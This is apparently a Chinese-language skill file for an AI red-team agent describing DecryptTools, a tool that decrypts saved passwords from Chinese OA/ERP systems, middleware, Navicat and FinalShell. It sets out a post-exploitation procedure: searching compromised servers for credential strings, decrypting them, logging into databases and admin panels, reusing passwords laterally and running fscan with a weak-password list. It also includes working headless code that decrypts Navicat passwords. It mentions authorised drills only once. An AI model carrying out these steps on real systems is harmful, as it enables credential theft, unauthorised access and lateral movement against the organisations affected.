---
name: decrypt-tools
description: '国产 OA/ERP/中间件与运维工具加解密（wafinfo/DecryptTools）：一键解 22 类密文——用友 NC/YonBIP/NCCLOUD、金蝶 EAS/K3Cloud、致远 OA（含全文件/2.4 数据库口令/GZIP）、蓝凌（含 SM4/Token）、万户 OA、宏景 ERP、湖南强智、瑞友天翼、帆软报表 10/11、H3C CAS/新华三 IMC、Weblogic、JBOSS、Jasypt(SpringEnc)、Druid、海康 iSecure/iVMS8700/IP Camera、Navicat 11/12+、FinalShell，并带弱口令查询。用于后渗透：从服务器配置文件里解出数据库连接串与后台管理员口令，把服务器权限推进成后台/数据库权限。'
---

# 综合解密（DecryptTools）

一句话定位：**拿到服务器权限之后，把"配置里那串看不懂的密文"变成能直接登录的口令**。国产 OA/ERP 是重灾区，这套覆盖面在国内靶标上命中率很高。

## 一、在哪、怎么起（本机实测 2026-10-23）

| 项 | 值 |
|---|---|
| 素材根目录 | `C:\Users\Administrator\.dsh\skills-src\wafinfo__DecryptTools\DecryptTools-main` |
| 主程序 | `DecryptTools.jar`（28,742,180 B，14,359 个 class，`Main-Class: com.decrypttools.MainApplication`） |
| 运行时 | Java 21 已装（`openjdk 21.0.12.1 LTS`，Microsoft build）——**但不带 JavaFX，GUI 起不来，见下** |
| 弱口令字典 | `password.txt`（7,406 B，常见口令按频次排序：123456 / password / 12345678 / qwerty …） |
| 备忘录 | `config.properties`（IMCINFO / EASINFO / LANDRAYINFO / EZOFFICEINFO 四个键，工具内"备忘录"写这里） |

### 启动前提：需要 JavaFX（本机实测踩坑）

`MainApplication` 继承 `javafx.application.Application`，**不是 Swing**。本机只有 Microsoft JDK 21（不含 JavaFX），直接跑实测：

```
$ java -jar DecryptTools.jar
错误: 缺少 JavaFX 运行时组件, 需要使用该组件来运行此应用程序
```

三条可行路径，按代价排序：

1. **换带 JavaFX 的 JDK（最省事）**：BellSoft **Liberica Full** JDK 21，或 Azul **Zulu FX** 21 —— 装完 `java -jar` 直接起 GUI。
2. **单独补 JavaFX SDK**（OpenJFX 21 与 JDK 21 配套）：
   ```powershell
   java --module-path "C:\path\to\javafx-sdk-21\lib" --add-modules javafx.controls,javafx.fxml `
        -cp DecryptTools.jar com.decrypttools.MainApplication
   ```
3. **不开 GUI**：直接调 jar 里的工具类（见第五节）—— 纯命令行可用，**推荐先走这条**。

> 另外：GUI 需要桌面会话，纯 SSH/无头环境即便有 JavaFX 也起不来；演练机上用 VNC/RDP 开会话再跑。

## 二、支持清单（README v3.1，2025/03）

| 分类 | 产品 | 能解什么 |
|---|---|---|
| 协同/OA | 致远 OA（Seeyon） | 全文件解密、2.4 数据库口令、GZIP 压缩/解压、SM4 |
| | 蓝凌（Landray/EIS） | DES / **SM4** / Token / 用户口令 |
| | 万户 OA、宏景 ERP、湖南强智、瑞友天翼 | 配置/数据库/用户 NT 口令 |
| ERP/财务 | 用友 NC / NC65 / YonBIP / NCCLOUD | 数据库口令、用户口令、传输包加解密、**加密** |
| | 金蝶 EAS / K3 Cloud 云星空 | 数据库口令（含密文替换） |
| 报表/中间件 | 帆软报表 10/11、H3C CAS、新华三 IMC、金盘 OPAC | 数据库口令、配置项 |
| | Weblogic、JBOSS、Jasypt(原 SpringEnc)、Druid | 配置里的加密口令 |
| 安防 | 海康 iSecure（全平台）、iVMS-8700、IP Camera | 配置文件里的用户口令（iVMS 已不需 dll） |
| 运维工具 | Navicat 11 / 12+、FinalShell | 本地保存的连接口令 |
| 其它 | 亿赛通、密码查询（弱口令库） | 密文 / 口令反查 |

## 三、后渗透 SOP（这是它的真正用法）

1. **落地找密文**（服务器上，按产品定路径）：
   ```powershell
   # 通用起手：找配置里带 password / jdbc / encrypt 的行
   Get-ChildItem C:\ -Recurse -Include *.properties,*.xml,*.ini,*.config -ErrorAction SilentlyContinue |
     Select-String -Pattern 'password\s*=|jdbc:|encrypt|ENC\(' -List | Select-Object -First 40 Path,Line
   ```
   Linux 侧同义：`grep -rIl --include=*.properties -e 'jdbc:' -e 'password' /opt /usr/local /home`
2. **判产品 → 选对应的解密 tab**（用上表；认不准就看 jar 里对应 Controller 的字段格式）。
3. **解出明文** → 得到 `jdbc:mysql://IP:3306/db?user=root&password=xxx` 或后台管理员口令。
4. **立刻验证**（别只当"拿到凭据"）：
   - 数据库：`mysql -h IP -uroot -pxxx` 或 `impacket` / navicat；
   - 后台：浏览器实测登录（**能登录才记账号权限分**）；
   - 复用：同口令横向（国产 OA 常一码多用）→ 交给 `credential-attack` / `lateral-movement`。
5. **落库**：`redteam_credential_add`（明文写 `secret_value`）+ `redteam_score_hit`（账号/数据库权限）。

## 四、弱口令字典（顺手就有的战利品）

`password.txt` 是**按真实频次排序**的常见口令表，可直接喂扫描器：

```powershell
# fscan 的 -p 用字典文件
fscan.exe -h 10.0.0.0/24 -p "C:\Users\Administrator\.dsh\skills-src\wafinfo__DecryptTools\DecryptTools-main\password.txt"
# 或者合并到自己的字典
Get-Content password.txt | Add-Content C:\Users\Administrator\Downloads\wordlists\cn-common.txt
```

## 五、不开 GUI：直接调 jar 里的类（headless）

jar 里除产品 Controller 外还有一批**纯算法类**，可绕开界面复用（`com/decrypttools/utils/` 实测存在）：

| 类 | 用途 |
|---|---|
| `SM4` / `SM4Util` / `SM4Context` / `PasswordConfusionSM4` / `SeeyonSM4` | 国密 SM4（蓝凌/致远系） |
| `DES` / `Base64` / `MacMD5` / `SHA256Sign` / `GZip` | 通用算法与压缩 |
| `navicat/Navicat11Cipher` `Navicat12Cipher` `NavicatCipherFactory` `VersionEnum` | Navicat 11/12+ |
| `ecrypttools/jwxt/utils/DesEncrypt` | 教务系统（强智系） |
| `PropertiesUtil` / `StringUtil` / `FilesToList` / `TagUtils` | 配置读取与批处理 |

**实测签名**（`javap` 导出，2026-10-23）：

```
Base64.byteArrayToBase64(byte[]) / base64ToByteArray(String)
      .byteArrayToAltBase64(byte[]) / altBase64ToByteArray(String)
DES(long key)  -> encrypt(long) / decrypt(long)
SM4Util.decrypt(String, String) / decrypt(byte[], byte[]) / decrypt2Byte(byte[], byte[])
Navicat11Cipher().decryptString(String) / encryptString(String)      // DefaultUserKey 内置
```

**坑：JDK 11+ 必须补 JAXB**。`Navicat11Cipher` 静态初始化用了 `javax.xml.bind.DatatypeConverter`（JDK 11 起被移除），直接跑会：
`NoClassDefFoundError: javax/xml/bind/DatatypeConverter`。补一个 jar 即可（已下到 `DecryptTools-main/lib/jaxb-api-2.3.1.jar`）：

```powershell
$dir = "C:\Users\Administrator\.dsh\skills-src\wafinfo__DecryptTools\DecryptTools-main"
# 已下载：Invoke-WebRequest "https://repo1.maven.org/maven2/javax/xml/bind/jaxb-api/2.3.1/jaxb-api-2.3.1.jar" -OutFile "$dir\lib\jaxb-api-2.3.1.jar"
java -cp ".;$dir\DecryptTools.jar;$dir\lib\jaxb-api-2.3.1.jar" YourMain
```

**实测通过的 headless 调用**（自写 `TestDT.java`，`javac -encoding UTF-8 -proc:none -cp DecryptTools.jar TestDT.java`）：

```java
Navicat11Cipher c = new Navicat11Cipher();
String enc = c.encryptString("P@ssw0rd!");
System.out.println(enc);              // 430436CF11852EBCD6
System.out.println(c.decryptString(enc));   // P@ssw0rd!
```

```
navicat11 enc = 430436CF11852EBCD6
navicat11 dec = P@ssw0rd!
```

> 摸其它类的方法名：`javap -classpath DecryptTools.jar com.decrypttools.utils.SM4Util`，别照抄猜的参数顺序。

## 六、坑与边界

- **纯 GUI，且要 JavaFX**：无参数、无 `--help`；本机 Java 21 实测 `java -jar` 报 `缺少 JavaFX 运行时组件`（不是 HeadlessException）。要 GUI 就换 Liberica Full / Zulu FX，或补 JavaFX SDK 按第一节第 2 条启。
- **Java 版本**：jar 是给 Java 8 时代编译的；Java 21 下**类库能加载**（`javap` 正常），但用到 `javax.xml.bind` 的类必须补 `jaxb-api`（已在 `lib/jaxb-api-2.3.1.jar`）。jar 内已 fat-jar 打包 druid/fastjson/seeyon 依赖，其它不用另配 classpath。
- **它不是万能解**：只覆盖上表产品；遇到自研加密（AES + 自定义 key）回到 `ctf-tools` 或直接读源码取 key。
- **配置/备忘录会写同级目录** `config.properties` —— 别把别人的密码留在里面就交付报告。
- 这是**别人的工具**：只在授权演练/CTF 环境下用；解出来的密文属于靶标数据，按演练规则入库、不外传。
